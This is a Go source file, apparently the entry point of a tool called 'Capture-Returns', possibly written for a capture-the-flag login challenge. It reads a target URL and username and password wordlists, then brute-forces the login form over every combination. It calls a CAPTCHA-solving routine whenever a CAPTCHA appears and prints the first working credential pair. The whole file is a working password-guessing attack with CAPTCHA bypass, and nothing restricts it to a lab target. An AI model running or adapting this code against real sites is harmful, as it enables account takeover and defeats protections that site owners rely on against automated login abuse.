// main package
package main

import (
	"Menchen13/Capture-Returns/brute"
	"Menchen13/Capture-Returns/captcha"
	"errors"
	"flag"
	"fmt"
	"net/http"
	"os"
	"strings"
)

func main() {

	U := flag.String("u", "", "Url to attack")
	userfile := flag.String("l", "", "Path to file with usernames")
	passfile := flag.String("p", "", "Path to file with passwords")
	flag.Parse()
	if *U == "" {
		fmt.Println("No Url specified")
		flag.PrintDefaults()
		return
	} else if *userfile == "" {
		fmt.Println("No userfile specified")
		flag.PrintDefaults()
		return
	} else if *passfile == "" {
		fmt.Println("No passfile specified")
		flag.PrintDefaults()
		return
	}

	u := *U
	//add the login part if needed
	if !strings.Contains(u, "login") {
		u += "/login"
	}

	//check if url is reachable
	_, err := http.Get(u)
	if err != nil {
		fmt.Println("Error reaching url! ", err)
		return
	}

	//read in user and pass file
	userSlice, passSlice, err := FiletoSlice(userfile, passfile)
	if err != nil {
		fmt.Println("Error when parsing file to slice: ", err)
		return
	}

	//main bruteloop

	for _, v := range userSlice {
		for _, k := range passSlice {

			if captcha.IsCaptcha(u) {
				captcha.Solver(u)

			} else if brute.Orca(u, v, k) {
				fmt.Println("Done! Found combination:  ", v, ":", k)
				return
			}
		}
		fmt.Println("Finished username: ", v)
	}
	fmt.Println("Failed to find valid user:pass combination!")

}

//func try(user string, pass string)

func linebreak(r rune) bool {
	if r == '\n' || r == '\r' {
		return true
	} else {
		return false
	}
}

// takes path to userfile and path to passfile and returns slices of the lists
func FiletoSlice(userfile *string, passfile *string) (u []string, p []string, e error) {
	user, err := os.ReadFile(*userfile)
	if err != nil {
		return nil, nil, err
	}

	pass, err := os.ReadFile(*passfile)
	if err != nil {
		return nil, nil, err
	}

	//turn user and pass file into slices for easier iteration
	var userSlice []string = strings.FieldsFunc(string(user), linebreak)
	var passSlice []string = strings.FieldsFunc(string(pass), linebreak)

	if userSlice == nil || passSlice == nil {
		return nil, nil, errors.New("nil slice detected")
	}

	return userSlice, passSlice, nil
}
